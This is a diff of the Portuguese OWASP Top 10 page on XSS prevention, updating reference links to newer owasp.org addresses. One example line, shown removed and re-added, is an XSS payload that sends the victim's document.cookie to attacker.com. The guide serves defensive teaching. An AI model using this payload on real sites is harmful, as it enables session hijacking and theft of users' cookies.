@@ -21,7 +21,7 @@ Prevenir XSS requer a separação de dados não confiáveis do conteúdo ativo d
 
 * Use frameworks que automaticamente escapam o XSS por design, como os mais recentes Ruby on Rails, React JS. Aprenda as limitações de proteção XSS de cada framework e cuide adequadamente os casos de uso que não são cobertos.
 * Usar frameworks que automaticamente sanitizam o XSS por design, como Ruby on Rails e React JS mais recentes. Aprenda as limitações de proteção XSS de cada framework e cuide adequadamente os casos de uso que não são cobertos.
-* Sanitizar por *escape* dados de solicitação HTTP não confiáveis com base no contexto na saída HTML (corpo, atributo, JavaScript, CSS ou URL) irá resolver vulnerabilidades XSS refletidas e armazenadas. A [Folha de Dicas OWASP 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) contém detalhes sobre técnicas de *escape* de dados necessárias.
+* Sanitizar por *escape* dados de solicitação HTTP não confiáveis com base no contexto na saída HTML (corpo, atributo, JavaScript, CSS ou URL) irá resolver vulnerabilidades XSS refletidas e armazenadas. A [Folha de Dicas OWASP 'XSS Prevention'](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) contém detalhes sobre técnicas de *escape* de dados necessárias.
 * Aplicar *encoding* sensível ao contexto ao modificar o documento do navegador no lado do cliente atua contra DOM XSS. Quando isso não puder ser evitado, técnicas de *escaping* sensíveis ao contexto semelhantes podem ser aplicadas às APIs do navegador, conforme descrito na Folha de Dicas OWASP 'DOM Based XSS Prevention'.
 * Habilitar um [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) é um controle de mitigação de defesa profunda contra o XSS. É eficaz se não existem outras vulnerabilidades que permitiriam colocar códigos maliciosos através de arquivos locais (por exemplo, sobrescritas de *path traversal* ou bibliotecas vulneráveis em fontes permitidas).
 
@@ -33,7 +33,7 @@ Prevenir XSS requer a separação de dados não confiáveis do conteúdo ativo d
 
 O atacante modifica o parâmetro 'CC' no navegador para:
 
-`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
+`'><script>document.location='https://attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
 
 Este ataque faz com que a ID da sessão da vítima seja enviada para o site do invasor, permitindo que o invasor seqüestra a sessão atual do usuário.
 
@@ -43,16 +43,16 @@ Este ataque faz com que a ID da sessão da vítima seja enviada para o site do i
 
 ### OWASP
 
-* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
-* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
-* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
-* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
-* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
-* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
-* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
-* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
-* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)
+* [OWASP Proactive Controls: Encode Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Proactive Controls: Validate Data](https://owasp.org/www-project-proactive-controls/v3/en/c4-encode-escape-data)
+* [OWASP Application Security Verification Standard: V5](https://owasp.org/www-project-application-security-verification-standard/)
+* [OWASP Testing Guide: Testing for Reflected XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)
+* [OWASP Testing Guide: Testing for Stored XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting)
+* [OWASP Testing Guide: Testing for DOM XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)
+* [OWASP Cheat Sheet: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+* [OWASP Cheat Sheet: DOM based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+* [OWASP Cheat Sheet: XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+* [OWASP Java Encoder Project](https://owasp.org/www-project-java-encoder/)
 
 ### Externas
 
